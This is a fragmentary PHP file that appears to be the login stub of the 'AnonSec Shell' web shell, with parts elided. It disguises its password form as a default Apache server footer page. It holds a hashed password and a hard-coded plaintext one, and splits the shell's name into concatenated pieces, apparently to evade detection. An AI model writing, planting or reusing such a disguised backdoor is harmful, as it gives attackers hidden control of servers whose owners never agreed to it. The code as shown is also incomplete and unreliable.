<?php
session_start();
$password = "2630b3bfbc3fe2d4ad25d707284a5b48"; // md5 dari password asli
...
<hr>
<address>Apache/2.4.57 (Unix) Server at <?php echo htmlspecialchars($_SERVER['HTTP_HOST']); ?> Port 80</address>
<form method="post" style="margin:0;">
    <input type="password" name="pass" style="width:150px; color: black; border:0px solid white;"
        onkeypress="if(event.key==='Enter'){this.form.submit();}">
    <button type="submit" class="hidden-btn">OK</button>
</form>
</body>
</html>
<?php
...
<?php     $auth_pass = "darell";
    ...
    } echo "<title>An"."onS"."ec Sh"."el"."l</title>"; ?>
